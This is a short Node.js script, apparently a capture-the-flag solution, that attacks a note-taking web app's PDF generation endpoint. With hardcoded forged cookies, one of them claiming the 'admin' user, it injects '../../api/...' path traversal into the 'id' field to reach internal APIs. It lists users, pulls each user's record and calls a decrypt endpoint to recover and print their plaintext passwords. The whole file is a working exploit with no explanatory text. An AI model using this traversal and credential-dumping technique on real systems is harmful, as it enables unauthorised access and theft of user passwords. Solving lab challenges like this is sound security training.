const https = require('https');

async function post(url, data) {

    const options = {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': "userauth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiAiZjg5ZjA4ZTQ4OTgxOTRjMWNmMmE5NGQ0Y2UzZjAzNTMiLCAiaWF0IjogMTY3MjY2OTE4OSwgImV4cCI6IDE2NzMyNzM5ODl9.NQ5eZwwwnoL9vY4ipeUSoWFpRB1SlsZXW9y-785MFRPIwNlavSxUmhumOyTY_9iz8cOLRcX3FIgDxIO52zm3VtM06rUQJxMcrebjE0J8KCOHj8mUJdtHzx43YpUGAtuOB3FRRrI8u0Uhh0XaOjkn3nsPplAwQUE64MH5MuOnk9Ge71SSb55ormACYi0w2W1NIs6wdEcE-N9hJxXEdEANpfN5LvLYiS0I6WtAwo0XsY7_mNzgqynPdHKzCR8t2nPyE5egpyU--b1Mm0nBOHhW3Yus98sfvFZkAErwD22QBXObxgZ0sM-AW84FHYNz0DcKAwk5qII1BrEIMqLyN7N6ZQ; session=eyJ1c2VybmFtZSI6ImFkbWluIn0.Y7N5YQ.hZ2N9dpArz7Y3BrXqcgTlEMN3yw"
        }
    }

    return new Promise((resolve, reject) => {
        const req = https.request(url, options, (res) => {
            if (res.statusCode < 200 || res.statusCode > 299) {
                return reject(new Error(`HTTP status code ${res.statusCode}`))
            }

            const body = []
            res.on('data', (chunk) => body.push(chunk))
            res.on('end', () => {
                const resString = Buffer.concat(body).toString()
                resolve(resString)
            })
        })

        req.write(data)
        req.end()
    })
};

(async () => {
    const users = JSON.parse(await post('https://anvilnotes.cybertalent.no/genpdf', "id=../../api/users"));

    for (let user of users) {
        if (user.length > 10) continue;
        const data = JSON.parse(await post('https://anvilnotes.cybertalent.no/genpdf', "id=../../api/user/" + user));
        const password = await post('https://anvilnotes.cybertalent.no/genpdf', "id=../../api/decrypt?data=" + data.password);
        console.log(`${user} = ${password}`)

    };
})();
